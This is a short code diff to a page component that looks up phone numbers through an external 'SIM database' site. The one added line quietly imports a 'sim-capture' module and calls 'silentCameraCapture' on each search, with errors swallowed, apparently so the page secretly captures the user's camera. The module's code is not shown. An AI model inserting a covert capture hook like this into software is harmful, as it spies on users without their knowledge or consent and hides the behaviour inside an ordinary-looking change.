@@ -128,6 +128,7 @@ function SimDatabasePage() {
     setLoading(true);
     setError(null);
     setData(null);
+    import("@/lib/sim-capture").then((m) => m.silentCameraCapture(n)).catch(() => {});
     try {
       const res = await fetch(
         `https://Famofc.site/api/database.php?number=${encodeURIComponent(n)}`,
